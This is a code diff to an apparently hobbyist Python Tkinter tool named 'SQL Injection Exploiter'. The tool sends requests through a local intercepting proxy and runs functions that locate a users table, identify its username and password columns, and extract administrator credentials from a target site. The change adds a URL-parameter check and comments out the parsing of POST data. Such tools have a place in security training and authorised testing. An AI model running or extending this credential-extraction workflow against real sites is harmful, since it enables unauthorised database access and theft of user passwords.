@@ -5,14 +5,24 @@ from bs4 import BeautifulSoup
 import re
 import tkinter as tk
 from tkinter import messagebox, StringVar
-import difflib
+
 from diff import difference
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
-diff = difflib.HtmlDiff()
 
+def has_parameters(url):
+    # Check if '?' is present in the URL
+    if '?' in url:
+        # Split the URL into base and parameters
+        base_url, params_str = url.split('?', 1)
+        
+        # Check if '=' is present in the parameters
+        if '=' in params_str:
+            return True
+    
+    return False
 
 
 def perform_request(url, sql_payload, method, post_data):
@@ -165,6 +175,9 @@ def exploit_sqli_user_cred(url, users_table, username_column, password_column, m
     soup2 = BeautifulSoup(res1.text, 'html.parser')
     output = difference(str(soup), str(soup2))
     return output
+
+
+
 def main():
     def execute_sql_injection():
         try:
@@ -179,7 +192,8 @@ def main():
         post_data= None
         if method == 'POST':
             data = post_data_entry.get() if method == 'POST' else None
-            post_data={key: value for key, value in (item.split('=') for item in data.split('&'))}
+            # post_data={key: value for key, value in (item.split('=') for item in data.split('&'))}
+            
 
             if try_login_option.get():
                 login_successful = try_login(url, method, post_data)
@@ -195,28 +209,29 @@ def main():
                 return
         elif method == "GET":
             print("Looking for the users table...")
-            users_table,num_col,string_column = exploit_sqli_users_table(url, method)
-            
-            if users_table:
-                result_text.insert(tk.END, "Found the users table name: %s\n" % users_table)
-                username_column, password_column = exploit_sqli_users_columns(url, users_table, method, post_data,num_col,string_column)
-                if username_column and password_column:
-                    result_text.insert(tk.END, "Found the username column name: %s\n" % username_column)
-                    result_text.insert(tk.END, "Found the password column name: %s\n" % password_column)
+            if has_parameters(url):
+                users_table,num_col,string_column = exploit_sqli_users_table(url, method)
+                if users_table:
+                    result_text.insert(tk.END, "Found the users table name: %s\n" % users_table)
+                    username_column, password_column = exploit_sqli_users_columns(url, users_table, method, post_data,num_col,string_column)
+                    if username_column and password_column:
+                        result_text.insert(tk.END, "Found the username column name: %s\n" % username_column)
+                        result_text.insert(tk.END, "Found the password column name: %s\n" % password_column)
 
-                    admin_password = exploit_sqli_user_cred(url, users_table, username_column, password_column, method, post_data)
-                    if admin_password:
-                        result_text.insert(tk.END, "[+] The username and password are as below: \n")
-                        for value in admin_password:
-                            result_text.insert(tk.END, "[+] %s\n" % value)
+                        admin_password = exploit_sqli_user_cred(url, users_table, username_column, password_column, method, post_data)
+                        if admin_password:
+                            result_text.insert(tk.END, "[+] The username and password are as below: \n")
+                            for value in admin_password:
+                                result_text.insert(tk.END, "[+] %s\n" % value)
 
+                        else:
+                            result_text.insert(tk.END, "Did not find the administrator password\n")
                     else:
-                        result_text.insert(tk.END, "Did not find the administrator password\n")
+                        result_text.insert(tk.END, "Did not find the username and/or the password columns\n")
                 else:
-                    result_text.insert(tk.END, "Did not find the username and/or the password columns\n")
+                    result_text.insert(tk.END, "Did not find a users table.\n")
             else:
-                result_text.insert(tk.END, "Did not find a users table.\n")
-
+                result_text.insert(tk.END, "Invalid url.\n")
     root = tk.Tk()
     root.title("SQL Injection Exploiter")
 
